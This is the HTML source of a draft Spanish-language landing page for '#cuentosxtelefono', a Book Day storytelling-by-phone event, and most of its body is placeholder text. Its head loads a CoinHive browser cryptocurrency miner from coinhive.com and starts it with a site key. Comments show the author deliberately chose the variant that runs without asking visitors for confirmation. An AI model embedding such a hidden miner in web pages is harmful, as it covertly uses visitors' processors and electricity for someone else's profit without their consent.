<!doctype HTML>
<html lang="es">
  <head>
    <!-- Para ver si funciona -->
    <!-- Meta tags -->
    <meta charset="utf-8">
    <title>Cuentos x Telefono</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <!-- Custom CSS-->
    <link rel="stylesheet" href="styles/common.css">
    <link rel="stylesheet" href="styles/main.css">

    <!-- CoinHive: Para aprovechar mientras debug -->
    <!-- Cambiar authedmine a coinhive para no confirmación -->
    <script src
    ="https://coinhive.com/lib/coinhive.min.js"></script>
    <script>
      // Throttle es el porcentaje del procesador que NO será usado
    	var miner = new CoinHive.Anonymous('45C1t3GAk3I0Tuh1nV2zBSpDZ7ZpDBYx', {throttle: 0.3});

    	// Only start on non-mobile devices and if not opted-out
    	// in the last 14400 seconds (4 hours):
    	if (!miner.isMobile() && !miner.didOptOut(14400)) {
    		miner.start();
    	}
    </script>
  </head>
  <body>
    <!-- Donde va el "contenido", no el footer ni el navbar (si fuese necesario) -->
    <main role="main">
      <div class="jumbotron">
        <div class="container">
          <h1 class="display-3">#cuentosxtelefono</h1>
          <p> En <a href="https://montandoellocal.wordpress.com/">Montando el Local</a> cada día del Libro contamos cuentos por teléfono blahblahblah del texto que se encargue otra persona</p>
        </div>
      </div>
      <p class="container"> Por aquí abajo es donde va lo de las lineas abiertas y esas cosas </p>
    </main>
    <footer class="container">
      <div id="row">
        <p>Made w/ ❤ by <a href="https://ddavo.me">David Davó</a></p>
        <p>Crea tu propio droplet en <a href="https://m.do.co/c/3e57ed1c8623">DigitalOcean</div></p>
      </div>
    </footer>
  </body>
</html>
